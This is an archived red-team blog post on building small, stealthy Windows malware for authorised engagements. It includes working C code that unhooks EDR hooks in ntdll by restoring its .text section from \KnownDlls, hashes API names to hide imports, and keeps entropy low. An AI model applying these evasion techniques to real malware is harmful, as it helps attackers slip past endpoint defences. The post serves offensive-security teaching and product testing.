{
    "id": "af249a08-7682-4461-b7b6-97b31e8d9230",
    "created_at": "2023-01-12T14:59:35.920218Z",
    "updated_at": "2025-03-27T02:06:08.539193Z",
    "deleted_at": null,
    "sha1_hash": "93edb05f4fe4aa25ff4a5b53c43f369c3ab64f4d",
    "title": "2022-11-16 - Writing Tiny, Stealthy & Reliable Malware",
    "authors": "",
    "file_creation_date": "2022-11-28T19:06:30Z",
    "file_modification_date": "2022-11-28T19:06:30Z",
    "file_size": 1304877,
    "plain_text": "# Writing Tiny, Stealthy & Reliable Malware\n\n**[ruptura-infosec.com/blog/writing-tiny-stealthy-reliable-malware/](https://ruptura-infosec.com/blog/writing-tiny-stealthy-reliable-malware/)**\n\nRad Kawar – 16/11/2022\n\n### Introduction\n\n\nNovember 17, 2022\n\n\n[The following blog post will cover the techniques discussed in the previous talk at Steelcon.](https://youtu.be/TfG9lBYCOq8)\n\nWhen it comes to writing custom tooling for engagements, the motivations associated with it\noften vary. At a high level, as a consultancy, having the capabilities to produce allows us to\noffer a niche but more realistic engagement. We can emulate the adversaries who target\nsimilar businesses in the same industry – ultimately giving the client a better assessment of\ntheir overall security posture through a profound offence against their various defensive\ncapabilities. Similarly, we have found ourselves on jobs where we have employed these\ncapabilities to empirically determine and compare the effectiveness of two security products.\n\n### Thought Processes\n\nPicking a language is often convoluted, with pros and cons with each language. You should\nnot select a language specifically for its evasive features; an argument often used when\npicking esolangs like Zig and Nim.\n\nThe reasoning behind requiring a small binary size is two-part: it gives us more flexibility\nwhen we’re looking to trojan (backdoor) an application, and there is less network traffic.\nNewer languages such as Rust & Golang offer portability and other convincing features but\nlack what a bit of good ol’ C and Assembly offer: a minimal binary. Another essential\nrequirement is that we should not have any version-specific dependency, for example, on a\nparticular version of .NET or a CRT version—thus giving us backward compatibility.\n\n\n-----\n\nWe write most of our offensive tooling in C and assembly for this reason (and our familiarity\nwith the languages).\n\n[Compiling a “Hello World” program on Windows using the Visual Studio toolchain is](https://en.wikipedia.org/wiki/The_C_Programming_Language)\ndeceiving:\n```\n#include <stdio.h>\n\nint main() {\n\n printf(\"Hello World!\");\n\n}\n\n```\nWhen our program compiles into a PE file (portable executable), our compiler associates\nvarious information with the binary, which acts as the instructions for loading the executable.\nFor example, it contains information about what imports from which DLLs it requires in the\nImport Address Table. When I previously said it was deceiving, if you dumped the IAT of the\ncompiled executable (in Release mode), you’d notice several functions imported, none of\nwhich you had explicitly used!\n\nAs malware developers, we want explicit control over what is and is not to better expect and\nunderstand the outcomes. The portable executable format is exciting, and I urge you to delve\n[into the provided MSDN docs. While viewing the IAT for your compiled binary, you’ll see a](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)\nbinary synonymous with vcruntime140.dll; this is an issue as this is a version-specific\ndependency we WILL need to remove (we will get to that in a later part).\n\nYou can utilise the following Python script to dump some common PE properties, such as\ntheir hashes and entropies for various sections, imports, and strings greater than a length of\n7:\n\n\n-----\n\n```\n# https://github.com/rad9800/misc/blob/main/pe properties.py\n\nimport sys\n\nimport os\n\nimport hashlib   # Generating hashes\n\nimport pefile\n\n#\nhttps://github.com/erocarrera/pefile/blob/0d5ce5e0193c878cd57636b438b3746ffc3ae7e3/pef\n\ndef getEntropy(data):\n\n  import math\n\n  from collections import Counter\n\n  if not data:\n\n    return 0.0\n\n  occurences = Counter(bytearray(data))\n\n  entropy = 0\n\n  for x in occurences.values():\n\n    p_x = float(x) / len(data)\n\n    entropy -= p_x * math.log(p_x, 2)\n\n  return entropy\n\ndef printImports(pe):\n\n  for imports in pe.DIRECTORY_ENTRY_IMPORT:\n\n    print(imports.dll.decode().lower())\n\n    for i in imports.imports:\n\n      print(\"\\t\", hex(i.address), i.name.decode())\n\ndef getArch(pe):\n\n  if hex(pe.OPTIONAL_HEADER.Magic) == '0x10b':\n\n    return \"x86\"\n\n  elif hex(pe.OPTIONAL_HEADER.Magic) == '0x20b':\n\n    return \"x64_86\"     \n\ndef getTimestamp(pe):\n\n  import datetime\n\n  epoch_time = pe.FILE_HEADER.TimeDateStamp\n\n  date_time = datetime.datetime.fromtimestamp(epoch_time)\n\n  return date_time\n\ndef checkImports(pe):\n\n  if not hasattr(pe, \"DIRECTORY_ENTRY_IMPORT\"):\n\n    print(\"NO IMPORTS\")\n\nif __name__ == \"__main__\":\n\n  try:\n\n    pe = pefile.PE(sys.argv[1])\n\n    # Architecture is worth noting\n\n    print(\"File\\t\\t:\", sys.argv[1].split(\"\\\\\")[-1])\n\n```\n\n-----\n\n```\n    print( MD5 hash\\t:, hashlib.md5(pe.__data__).hexdigest())\n\n    print(\"SHA256 hash\\t:\", hashlib.sha256(pe.__data__).hexdigest())\n\n    print(\"Architecture\\t:\", getArch(pe))\n\n    print(\"Timestamp \\t:\", getTimestamp(pe))\n\n    print(\"Total Entropy \\t:\",getEntropy(pe.__data__))\n\n    print(\"Size \\t\\t: {:.1f}\".format(len(pe.__data__)/1000), \"KB\")\n\n    print(\"Sections\\t:\")\n\n    for section in pe.sections:\n\n      print(\"\\tName\\t\", section.Name.decode('UTF-8'))\n\n      print(\"\\tSize\\t\", section.SizeOfRawData, \"bytes\")\n\n      print(\"\\tEntropy\\t\", getEntropy(section.get_data()), \"\\n\")\n\n    if not hasattr(pe, \"DIRECTORY_ENTRY_IMPORT\"):\n\n      print(\"Imports \\t: NONE!\")\n\n    else:\n\n      print(\"Imports \\t:\")\n\n      printImports(pe)\n\n    strings = \"\\\\\\\\live.sysinternals.com@SSL\\\\DavWWWRoot\\\\strings.exe -accepteula\n-n 7 \" + sys.argv[1]\n\n    os.system(strings)\n\n  except:\n\n    print(\"python3 pe-properties.py <path to executable>\")\n\n### Entropy\n\n```\nEntropy is the measure of randomness, and one measure of maliciousness is entropy;\npacked files, often malicious, tend to be more random and thus have higher entropy. These\n**packed files tend to have an entropy of >=7.2. Knowing this, we should always check our**\nexecutable’s entropy and the individual sections. If you are writing a loader and storing\nencrypted shellcode in your .text section, you will most likely increase the entropy of your\n.text section.\n\n[There are various tricks, such as balancing it out with a sizeable zeroed-out array. Below we](https://github.com/rad9800/misc/blob/main/fix-entropy.cpp)\ncan see the output of running the script against a Lockbit Black binary, with quite a high\nentropy, and unsurprisingly it’s packed:\n\n### vcruntime140.dll\n\nBack to the previous topic at hand, that weird vcruntime140.dll. A quick google of the name\nsuggests other people have had this issue, but with a bit of intuition, it is easy to realise this\nis the DLL responsible for the Visual C Runtime library code. The CRT has various\nresponsibilities, including but not limited to calling global constructors, initialising static\nvariables, setting up the global SEH filter and calling out thread entry point.\n\n\n-----\n\nThe first way of getting rid of this dependency is by statically linking the DLL to our\nexecutable.\n\n**_Properties -> Configuration Properties -> C/C++ -> Code Generation_**\n\n**_– Runtime Library = Multi-threaded /MT_**\n\nStatically linking is not recommended at all – not only does it “bloat” your binary with 100kB\nof code, but it also increases your entropy and does not resolve all those dependencies you\nhad.\n\nTo take a step forward, we must first take two steps back. Let’s eliminate our print statement\nand try compiling an empty binary with no dependencies. As we know, the CRT calls our\nentry point, we want to override it. We can do this by specifying the entry point to our linker\nwith a comment/compiler switch.\n```\n#pragma comment(linker, \"/ENTRY:entry\")\n\nint entry() {\n\n  return 0;\n\n}\n\n```\nExplicitly specifying our entry point is a big step forward in the right direction, as we’ve\neliminated many imports and reduced our size to 5kB. There are still eight more imports,\nmost likely from the CRT. You can make changes to your solution to eradicate the C runtime\ndependencies.\n\n**_Properties -> Configuration Properties -> C/C++ -> Code Generation_**\n\n**_– Enable C++ Exceptions = No_**\n\n**_Properties -> Configuration Properties -> Linker -> Input_**\n\n**_-Ignore All Default Libraries = Yes (/NODEFAULTLIB)_**\n\n**_Properties -> Configuration Properties -> C/C++ -> Code Generation_**\n\n**_-Security Check = Disable Security Check (/GS-)_**\n\n**_-SDL checks = No (/sdl-)_**\n\nThe only downsides to removing the C runtime are mostly C++ specific, and we can no\nlonger use STD functions. To finally take one more step forward, we’ll show a “Hello Other\nWorld” where we have our first portable executable, small and with imports we control:\n\n\n-----\n\n```\n#include <Windows.h>\n\n#pragma comment(linker, \"/ENTRY:entry\")\n\n#define PRINT( STR, ... )                               \n   \\\n\n  if (1) {                                     \n   \\\n\n    LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );  \n   \\\n\n    if (buf != NULL) {                              \n   \\\n\n      int len = wsprintfW( buf, STR, __VA_ARGS__ );               \n   \\\n\n      WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), buf, len, NULL, NULL);   \n   \\\n\n      HeapFree( GetProcessHeap(), 0, buf );                   \n   \\\n\n    }                                       \n   \\\n\n  }                 \n\nint entry() {\n\n  PRINT(L\"Hello world.\\n\");\n\n  ExitProcess(0);\n\n}\n\n```\nThe dump of our imports clearly shows that we have complete control over our imports. We\nutilise a variadic macro (…) and __VA_ARGS__ to create a wrapper macro for wsprintfW to\nhave print output still.\n\n### EDR Unhooking\n\nEDRs utilise userland hooks to gain full introspection into the arguments passed to various\nfunctions. While it would be possible to live out of the kernel, as some EDRs such as Elastic\ndo, it is only sometimes feasible. EDRs can register their kernel drivers to be notified of\nvarious exposed activities, including but not limited to: when an image is loaded/mapped into\nmemory, a new thread is created/deleted, a process is created/deleted, and more.\n\n\n-----\n\nETW offers a more exciting package with their Threat Intelligence event that provides\ninformation on queued APCs, memory operations (allocation/protection/read/write),\ndevice/driver object load/unload, thread context setting, and suspending/resuming a\nthread/process. However, Microsoft only offers Microsoft-Windows-Threat-Intelligence to PPL\nprocesses. To understand the functionality exposed by Threat Intelligence, it is worth reverse\nengineering ntoskrnl.exe for a wealth of information.\n\nLooking back at userland hooking, we should first understand what a syscall looks like in\nNtdll.dll:\n\nThere are several ways to determine if a syscall is hooked, but we will check it using a\nmemcmp against the bytes of a correct syscall stub; if they don’t match, it likely means the\nfunction is hooked.\n\n\n-----\n\nFunctions get hooked; it happens; we now need to go back to looking at the PE format. As\nyou remember, executables have sections, one of which is the .text section—which contains\nthe executable code. In the Ntdll.dll we can consider the .text section to be compromised by\nan EDR userland DLL.\n\nWhat stops us from replacing the .text section with a fresh copy of Ntdll.dll from disk or\n\\KnownDlls?\n\n1. NtOpenSection(\\KnownDlls\\ntdll.dll) section object\n2. NtMapViewOfSection(section_object) = STATUS_IMAGE_NOT_AT_BASE\n3. Parse the mapped ntdll.dll to locate our .text section\n4. Get the size of our .text section\n5. Set this .text section to RWE (NtProtectVirtualMemory)\n6. Restore READ_EXECUTE permissions on our ntdll.dll .text section\n\nCredit must be given to these two for coming up with the original KnownDlls technique two\n[years ago exclusively at a similar time: @Jonaslyk](https://twitter.com/jonasLyk) [@modexpblog.](https://twitter.com/modexpblog)\n\n\n-----\n\n```\nHMODULE module (HMODULE)entry >DllBase;\n\n      PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)entry->DllBase;\n\n      PIMAGE_NT_HEADERS nt = RVA2VA<PIMAGE_NT_HEADERS>( entry->DllBase, dos>e_lfanew );\n\n      // https://www.ired.team/offensive-security/defense-evasion/how-tounhook-a-dll-using-c++\n\n      for( int i = 0; i < nt->FileHeader.NumberOfSections; i++ ) {\n\n        PIMAGE_SECTION_HEADER section =\n\n          (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION( nt ) +\n\n            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));\n\n\n        // thanks to modexp for the idea\n\n        // | 0x20202020 is lowercasing the text\n        // xet. is .tex in little endian\n\n        if( (*(ULONG*)section->Name | 0x20202020) == 'xet.' ) {\n\n          ULONG dw;\n\n          PVOID base = RVA2VA<LPVOID>( module, section->VirtualAddress );\n\n          ULONG size = section->Misc.VirtualSize;\n\n          // It's not a trivial task to make the DLL RW only especially in\nthe case of NTDLL as we'll be using\n\n          // various NT functions. PAGE_EXECUTE_READWRITE is a potential\nIOC.\n\n          // I leave that as a task to the reader to get around this.\n\n          // It is also worth nothing NtProtectVirtualMemory could be\nhooked.\n\n          if( NT_SUCCESS( API( NTDLL, NtProtectVirtualMemory )\n(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &dw) ) ) {\n\n            // Replacing all the DLLs with an unhooked version is a\npotential IOC if EDRs scan for unhooked DLLs\n\n            // Consider storing the hooked .text sections encrypted in an\nallocated buffer and restoring when\n\n            // you are done.\n\n            _memcpy(\n\n              RVA2VA<LPVOID>( module, section->VirtualAddress ),\n\n              RVA2VA<LPVOID>( addr, section->VirtualAddress ),\n\n              section->Misc.VirtualSize\n\n            );\n\n            // Restore original memory permissions\n\n            API( NTDLL, NtProtectVirtualMemory )(\n\n              NtCurrentProcess(),\n\n              &base,\n\n              &size,\n\n              dw,\n\n              &dw\n\n              );\n\n\n```\n\n-----\n\n```\n            PRINT( L [ ] Unhooked %s from \\\\KnownDlls\\\\%s \\n, basename\n>Buffer, basename->Buffer );\n\n          }\n\n        }\n\n      }\n\n```\nWe can then apply this technique to all DLLs by iterating through all the loaded DLLs, trying\nto open a handle to \\KnownDlls\\[DLL_NAME], and if this works, it’s a System32 DLL so we\ncan clean the .text section else it’s probably a useless/EDR dll.\n\nWe can then harness the power of constexpr to have compile-time API hashing WITHOUT\nlinking against the CRT, as it is all done at compile time.\n```\n#pragma region macros\n\n#define hash( VAL ) constexpr auto CONCAT( hash, VAL ) = HASHALGO( TOKENIZE( VAL ) );   \n\n#define dllhash(DLL, VAL ) constexpr auto CONCAT( hash, DLL ) = HASHALGO( VAL );      \n\n#define hashFunc( FUNCNAME, RETTYPE, ...)\n\\\n\nhash( FUNCNAME ) typedef RETTYPE( WINAPI* CONCAT( type, FUNCNAME ) )( __VA_ARGS__ );    \n\n#define API( DLL, FUNCNAME ) ( ( CONCAT( type, FUNCNAME ))GetProcAddrH( CONCAT( hash,\nDLL ),  \\\n\nCONCAT( hash,FUNCNAME ) ) )\ndllhash( KERNEL32, L\"KERNEL32.DLL\" )\n\ndllhash( NTDLL, L\"NTDLL.DLL\" )\n\nhashFunc( NtUnmapViewOfSection, NTSTATUS, HANDLE, PVOID );\n\nhashFunc( NtProtectVirtualMemory, NTSTATUS, HANDLE, PVOID*, PULONG, ULONG, PULONG );\n\nhashFunc( NtOpenSection, NTSTATUS, HANDLE*, ACCESS_MASK, OBJECT_ATTRIBUTES* );\n\nhashFunc( NtMapViewOfSection, NTSTATUS, HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T,\nPLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG );\n\nhashFunc( RtlInitUnicodeString, VOID, PUNICODE_STRING, PCWSTR );\n\n#pragma endregion\n\n```\nWe need to iterate through our loaded modules, uppercase, hash the DLL names, and check\nagainst a list of the DLL hashes we want. If it matches, we save the DllBase and continue. To\nget the address of a specific function, we need the DLL hash and a hash of the function\nname. We use the DLL hash to get the DllBase which we save in a global array, and we\niterate through its exports, hashing them one by one until we find a matching hash, and then\nwe bias the exported function to the ordinal and add the DllBase as it’s just a virtual address.\nWe are then returned the virtual address of the procedure, which we can then dynamically\ninvoke without ever having the function in our import address table!\n\n\n-----\n\n```\nvoid GetProcAddrH( UINT moduleHash, UINT funcHash )\n\n{\n\n  void* base = nullptr;\n\n  for( auto i : ModuleHashes ) {\n\n    if( i.Hash == moduleHash ) {\n\n      base = i.addr;\n\n    }\n\n  }\n\n  if( base == NULL ) {\n\n    return NULL;\n\n  }\n\n\n  for( DWORD i = 0; i < CACHE; i++ )\n\n  {\n\n    if( funcHash == HashCache[i].Hash ) {\n\n      return HashCache[i].addr;\n\n    }\n\n  }\n\n  PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;\n\n  PIMAGE_NT_HEADERS nt = RVA2VA<PIMAGE_NT_HEADERS>( base, dos->e_lfanew );\n\n  PIMAGE_EXPORT_DIRECTORY exports = RVA2VA<PIMAGE_EXPORT_DIRECTORY>( base, nt>OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );\n\n  if( exports->AddressOfNames != 0 )\n\n  {\n\n    PWORD ordinals = RVA2VA<PWORD>( base, exports->AddressOfNameOrdinals );\n\n    PDWORD names = RVA2VA<PDWORD>( base, exports->AddressOfNames );\n\n    PDWORD functions = RVA2VA<PDWORD>( base, exports->AddressOfFunctions );\n\n    for( DWORD i = 0; i < exports->NumberOfNames; i++ ) {\n\n      LPSTR name = RVA2VA<LPSTR>( base, names[i] );\n\n      if( HASHALGO( name ) == funcHash ) {\n\n        PBYTE function = RVA2VA<PBYTE>( base, functions[ordinals[i]] );\n\n        // Cache the result in a circular array\n        HashCache[hashPointer % CACHE].addr = function;\n\n        HashCache[hashPointer % CACHE].Hash = funcHash;\n\n        hashPointer = (hashPointer + 1) % CACHE;\n\n        PRINT( L\"%S found at 0x%p\\n\", name, function );\n\n        return function;\n\n      }\n\n    }\n\n  }\n\n  return NULL;\n\n}\n\n```\nWhat’s nice about this is that as the hashes are calculated at compile time, we can change\nthe algorithm quickly and avoid having to replace a header file of hashes with a Python script\netc\n\n\n-----\n\n[All the associated code is available on GitHub with the solution pre-configured for release. It](https://github.com/rad9800/WTSRM)\nbenefits from a few other features such as compile-time string encryption and hash caching\nto speed up repetitive API hashing.\n\n### Credits\n\n## A Cyber Security Partner You Can Trust\n\nRuptura InfoSecurity are a UK based cyber security provider. Our services are provided\nentirely in-house and are fully accredited by industry standard qualifications and standards.\n\n## Request a Quote\n\nIf your organisation requires our services, please get in contact using the form below:\n\n\n-----\n\n## About Us\n\n[Blog](https://www.ruptura-infosec.com/blog/)\n[Twitter](https://twitter.com/RupturaInfoSec)\n© Ruptura InfoSecurity Ltd – 2022. All Rights Reserved. Company Number: 11644559.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-11-16 - Writing Tiny, Stealthy & Reliable Malware.pdf"
    ],
    "report_names": [
        "2022-11-16 - Writing Tiny, Stealthy & Reliable Malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535575,
    "ts_updated_at": 1743041168,
    "ts_creation_date": 1669662390,
    "ts_modification_date": 1669662390,
    "files": {
        "pdf": "https://archive.orkl.eu/93edb05f4fe4aa25ff4a5b53c43f369c3ab64f4d.pdf",
        "text": "https://archive.orkl.eu/93edb05f4fe4aa25ff4a5b53c43f369c3ab64f4d.txt",
        "img": "https://archive.orkl.eu/93edb05f4fe4aa25ff4a5b53c43f369c3ab64f4d.jpg"
    }
}